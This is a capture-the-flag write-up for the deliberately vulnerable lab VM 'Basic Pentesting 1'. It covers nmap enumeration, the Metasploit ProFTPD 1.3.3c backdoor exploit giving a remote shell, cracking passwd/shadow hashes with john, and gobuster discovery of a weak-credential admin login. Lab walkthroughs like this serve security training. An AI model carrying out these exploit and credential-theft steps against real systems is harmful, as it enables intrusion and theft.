# Basic Pentesting 1

    Name: Basic Pentesting: 1
    Date release: 8 Dec 2017
    Author: Josiah Pierce
    Series: Basic Pentesting


## Approach 1

I was able to log in to the VM using the username as password
```
marlinspike
```

## Approach 2

I ran *netdiscover* to find the VM's IP address
```bash
netdiscover -r 192.168.0.0/24
```

Ran nmap to enumerate information on available ports
```bash
nmap -p- -T4 192.168.0.50
```

The following were the open ports:
```
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```


Running nmap with flag A provided me with the version number of the FTP service on port 21 (*proFTPD 1.3.3c*)
```bash
nmap -A -T4 -p21 192.168.0.50
```

Searched through exploit databases for an exploit that would work on proFTPD 1.3.3c
```bash
searchsploit proFTPD 1.3.3c
```
and found 
```
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                   | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                             | linux/remote/16921.rb
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

I then ran **msfconsole** to utilise the Metasploit Framework
```
msfconsole
```

Searched through Metasploit for proFTPD 1.3.3c's exploits
```bash
search proFTPD 1.3.3c
```
and found
```
#  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
```

Used the exploit by typing
```bash
use 0
```

Set the remote machine's host
```bash
set rhosts 192.168.0.50
```

Searched for available payloads
```bash
show payloads
```
and found
```
Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

I utilised the first payload (*index 0*)
```bash
use payload 0
```

I then ran the exloit and gained remote access to the machine
```bash
run
```
From the remote shell. I got the passwd and shadow files

Used unshadow to create a file that **john** could understand
```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

I then used **john** to run try and crack the hash and get the password
```bash
john passwords.txt
```

After completion, I ran the following command to get the password
```bash
john --show passwords.txt
```
and found
```
marlinspike:marlinspike:17484:0:99999:7:::
```

The password for user *marlinspike* is **marlinspike**


## Approach 3 (Gain access to website dashboard)

Opening the website on port 80, I found a generic home page.

I also added **vtcsec** to my ***/etc/hosts*** for easier navigation.

I used gobuster to find all the hidden directories on the site (The wordlist is found at ***)
```bash
gobuster dir -w /home/deusnoire/WordLists/Directories_Large.wordlist  -u 192.168.0.50 -t 200 -q | grep "Status: " > gobuster.txt
```
I navigated to the hidden directory */secret/* and found a login page (*/secret/wp-admin.php*).

Used **admin** as the username and **admin** as the password and successfully logged in to the dashboard.

